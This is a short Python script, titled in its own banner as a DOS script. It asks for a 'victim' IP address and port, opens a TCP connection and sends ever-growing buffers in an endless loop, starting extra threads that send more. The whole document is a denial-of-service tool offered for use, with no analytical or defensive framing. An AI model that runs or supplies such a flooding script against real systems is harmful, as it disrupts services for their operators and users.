import socket
import sys
import threading
import time
import colorama

print(colorama.Fore.GREEN)
print("-----------WELCOME TO OUR DOS SCRIPT-------------")
print(colorama.Fore.RESET)
ip=input("Enter the victim ip adres:")
port=int(input("Enter the port victim port:"))
package=0
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
def threading_process():
    global s
    global package
    s.send(bytes(package))
    package+=1
    time.sleep(0.01)
while True:
    try:
        s.send(bytes(package))
        print(f"Sended {package}")
        t=threading.Thread(target=threading_process)
        t.start()
    except Exception as e:
        print(e)
        sys.exit(1)

    package+=1







